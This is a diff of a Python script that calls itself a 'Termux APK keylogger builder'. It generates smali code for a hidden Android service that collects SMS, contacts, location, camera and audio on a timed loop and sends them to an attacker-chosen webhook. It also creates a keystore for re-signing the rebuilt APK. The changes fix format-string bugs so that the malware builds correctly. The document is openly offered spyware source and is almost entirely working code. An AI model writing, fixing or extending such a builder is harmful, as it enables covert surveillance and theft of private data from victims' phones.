@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v3.6 (FINAL FIX)
+  TERMUX APK KEYLOGGER BUILDER v3.6 (FINAL FORMAT FIX)
   Smali syntax fixed – APK rebuild now works
   Developer: GT Security Team
 ============================================================
@@ -77,11 +77,11 @@ def generate_keystore():
             "-dname", "CN=GT, OU=GT, O=GT, L=Delhi, ST=DL, C=IN"
         ], check=False, capture_output=True)
 
-# ---------------------------- SMALI GENERATOR (COMPLETE FIX) ----------------------------
+# ---------------------------- SMALI GENERATOR (FIXED FORMAT) ----------------------------
 def generate_smali(webhook, features, interval):
     """
     Returns (outer_smali, inner_smali) – both 100% valid smali syntax.
-    Fixes: escaped quotes in string literals, proper Thread.sleep().
+    Uses .format() to avoid f‑string escaping issues.
     """
     webhook_escaped = webhook.replace('"', '\\"')
     sms = 'true' if features.get('sms', False) else 'false'
@@ -90,18 +90,19 @@ def generate_smali(webhook, features, interval):
     camera = 'true' if features.get('camera', False) else 'false'
     audio = 'true' if features.get('audio', False) else 'false'
 
-    outer = f'''.class public Lcom/gt/CustomLogger;
+    # Outer class template – placeholders: {0}=interval, {1}=webhook, {2}=sms, etc.
+    outer_template = '''.class public Lcom/gt/CustomLogger;
 .super Landroid/app/Service;
 .source "CustomLogger.java"
 
 # static fields
-.field private static final INTERVAL:I = {interval}
-.field private static final WEBHOOK:Ljava/lang/String; = "{webhook_escaped}"
-.field private static final SMS:Z = {sms}
-.field private static final CONTACTS:Z = {contacts}
-.field private static final LOCATION:Z = {location}
-.field private static final CAMERA:Z = {camera}
-.field private static final AUDIO:Z = {audio}
+.field private static final INTERVAL:I = {0}
+.field private static final WEBHOOK:Ljava/lang/String; = "{1}"
+.field private static final SMS:Z = {2}
+.field private static final CONTACTS:Z = {3}
+.field private static final LOCATION:Z = {4}
+.field private static final CAMERA:Z = {5}
+.field private static final AUDIO:Z = {6}
 
 # direct methods
 .method public constructor <init>()V
@@ -120,9 +121,10 @@ def generate_smali(webhook, features, interval):
     return v0
 .end method
 '''
+    outer = outer_template.format(interval, webhook_escaped, sms, contacts, location, camera, audio)
 
-    # Inner class smali – fixed string escaping and Thread.sleep()
-    inner = f'''.class Lcom/gt/CustomLogger$1;
+    # Inner class template – placeholders: none (all smali literals)
+    inner_template = '''.class Lcom/gt/CustomLogger$1;
 .super Ljava/lang/Thread;
 .source "CustomLogger.java"
 
@@ -259,6 +261,7 @@ def generate_smali(webhook, features, interval):
     goto :goto_0
 .end method
 '''
+    inner = inner_template  # no placeholders
 
     return outer, inner
 
